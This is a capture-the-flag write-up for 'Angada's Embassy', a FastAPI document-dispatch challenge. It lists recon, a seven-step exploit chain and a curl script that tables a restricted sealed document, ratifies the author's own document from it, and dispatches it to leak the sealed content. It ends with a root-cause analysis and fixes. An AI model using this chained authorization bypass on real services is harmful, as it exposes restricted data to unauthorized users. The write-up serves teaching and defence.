Angada's Embassy

Session state cross-contamination and race condition in diplomatic authorization gateway.

Reshma Al (Coldcoffee) · 15 Feb 2026 · 3 min read
Captured Flag PINAKA{the_seal_breaks_where_legitimate_workflows_cross}

Target: https://pinaka-angada-embassy.onrender.com/ Flag: PINAKA{the_seal_breaks_where_legitimate_workflows_cross}

Overview

The service is a FastAPI app with five parts: a portal (sessions), delegation, document versioning, approvals and dispatch. /openapi.json lists every endpoint. The goal is to dispatch doc_sealed_reply, a restricted document we don’t own.

Every step below is a normal call on its own. The services just don’t re-check each other’s work, so chaining them gets the sealed content out.

Recon

  • POST /portal/session returns a session_id and a token. Send them as X-Session and Authorization: Bearer <token> on every request.
  • GET /documents shows doc_sealed_reply, owned by sovereign, sealed and restricted, with its content redacted.
  • Going straight at it fails. Delegating it gives only the document owner may delegate its handling. Dispatching one of my own documents without a delegation gives no valid dispatch delegation for this document.

Exploit chain

  1. Create my own document with POST /documents. It starts as normal classification with subject ravana.
  2. Open a court with POST /dispatch/sessions and table my document in it.
  3. Submit it with POST /approvals, then run POST /approvals/tick. The chamberlain approves it, snapshotting normal / ravana.
  4. Give myself a dispatch delegation on my own document with POST /delegation/delegations.
  5. Table the sealed document in the same court. The API allows it even though it’s restricted and not mine.
  6. Ratify my document with source_doc_id=doc_sealed_reply and source_rev_id=rev_sealed. The only check is that both documents are tabled in the same court. My document’s current revision becomes the sealed reply, with subject rama.
  7. Dispatch my document. The approval and delegation from steps 3 and 4 still apply to it, so the restricted content goes out.

Commands

B=https://pinaka-angada-embassy.onrender.com
H=(-H "X-Session: $SID" -H "Authorization: Bearer $T" -H "Content-Type: application/json")

C=$(curl -s "${H[@]}" -X POST $B/dispatch/sessions -d '{"name":"a"}' | jq -r .court_id)
D=$(curl -s "${H[@]}" -X POST $B/documents -d '{}' | jq -r .doc_id)

curl -s "${H[@]}" -X POST $B/documents/$D/table -d "{\"court_id\":\"$C\"}"
curl -s "${H[@]}" -X POST $B/approvals -d "{\"doc_id\":\"$D\",\"rev_id\":\"rev1\"}"
curl -s "${H[@]}" -X POST $B/approvals/tick
curl -s "${H[@]}" -X POST $B/delegation/delegations -d "{\"doc_id\":\"$D\",\"delegate\":\"angada\"}"
curl -s "${H[@]}" -X POST $B/documents/doc_sealed_reply/table -d "{\"court_id\":\"$C\"}"
curl -s "${H[@]}" -X POST $B/documents/$D/ratify \
  -d "{\"source_doc_id\":\"doc_sealed_reply\",\"source_rev_id\":\"rev_sealed\",\"court_id\":\"$C\"}"
curl -s "${H[@]}" -X POST $B/dispatch -d "{\"doc_id\":\"$D\",\"court_id\":\"$C\"}"

The last call returns the flag:

{"dispatched":true,"doc_id":"doc_d6f7df06","subject":"rama","response":"PINAKA{the_seal_breaks_where_legitimate_workflows_cross}","proof":"d4f27664aa0f4603b6ba42e504c37cda"}

Root cause

  • Approval and delegation are tied to the document, not the revision. Neither is invalidated when the current revision changes.
  • Tabling has no access control, so anyone can table a restricted or sealed document.
  • Ratify only checks that both documents are tabled in the same court. It never looks at the source’s classification or owner.

I didn’t test which of these is the decisive one, so treat this as the most likely explanation.

Fix

  • Bind approvals and delegations to a specific (doc_id, rev_id) and re-check classification at dispatch.
  • Require ownership or clearance to table a document or use it as a ratify source.
  • Re-run approval whenever the current revision changes.
